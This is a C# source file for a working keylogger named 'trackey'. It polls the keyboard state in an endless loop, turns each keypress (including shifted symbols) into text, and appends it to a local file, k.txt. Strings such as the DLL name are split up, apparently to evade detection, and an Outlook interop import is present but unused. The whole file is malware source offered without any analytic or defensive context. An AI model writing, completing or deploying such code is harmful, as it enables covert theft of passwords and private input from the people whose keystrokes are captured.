using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using Outlook = Microsoft.Office.Interop.Outlook;
using Microsoft.Office.Interop.Outlook;

namespace trackey
{
	static class Program
	{

		[DllImport("user3"+"2.d"+"ll")]
		public static extern int GetAsyncKeyState(Int32 i);

		[STAThread]
		static void Main(String[] args)
		{
			String buf = "";

			while (true)
			{
				Thread.Sleep(100);
				for (int i = 0; i < 255; i++)
				{
					int state = GetAsyncKeyState(i);

					if (state == 32769 || state == -32769)
					{
						bool shift = false;
						short shiftState = (short)GetAsyncKeyState(16);
						// Keys.ShiftKey does not work, so I put its numeric equivalent
						if ((shiftState & 0x8000) == 0x8000)
						{
							shift = true;
						}
						var caps = Console.CapsLock;
						bool isBig = shift | caps;


						if (((Keys)i) == Keys.Space) { buf += " "; continue; }
						if (((Keys)i) == Keys.Enter) { buf += "\r\n"; continue; }
		
						if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton
							|| ((Keys)i) == Keys.None
							|| ((Keys)i) == Keys.Cancel
							|| ((Keys)i) == Keys.XButton1
							|| ((Keys)i) == Keys.XButton2
							|| ((Keys)i) == Keys.ControlKey)
						{
							continue;
						}
						if (((Keys)i).ToString().Contains("Sh"+"ift") || ((Keys)i) == Keys.Capital) { continue; }
						if (!isBig)
						{
							
							if (i >= 48 && i <= 57)
							{
								switch (i)
								{
									
									case 48:
										buf += "0";
										break;
									case 49:
										buf += "1";
										break;
									case 50:
										buf += "2";
										break;
									case 51:
										buf += "3";
										break;
									case 52:
										buf += "4";
										break;
									case 53:
										buf += "5";
										break;
									case 54:
										buf += "6";
										break;
									case 55:
										buf += "7";
										break;
									case 56:
										buf += "8";
										break;
									case 57:
										buf += "9";
										break;

								}

							}
							else buf += ((Keys)i).ToString().ToLowerInvariant(); 
							

						}
						else
						{
							if (i >= 48 && i <= 57)
							{
								switch (i)
								{
								
									case 48:
										buf += ")";
										break;
									case 49:
										buf += "!";
										break;
									case 50:
										buf += "@";
										break;
									case 51:
										buf += "#";
										break;
									case 52:
										buf += "$";
										break;
									case 53:
										buf += "%";
										break;
									case 54:
										buf += "^";
										break;
									case 55:
										buf += "&";
										break;
									case 56:
										buf += "*";
										break;
									case 57:
										buf += "(";
										break;

								}
							}
							else buf += ((Keys)i).ToString();

						}
						if (buf.Length > 10)
						{
							File.AppendAllText("k.txt", buf);
							buf = "";
						}
					}

				}
			}

		}
	}
}
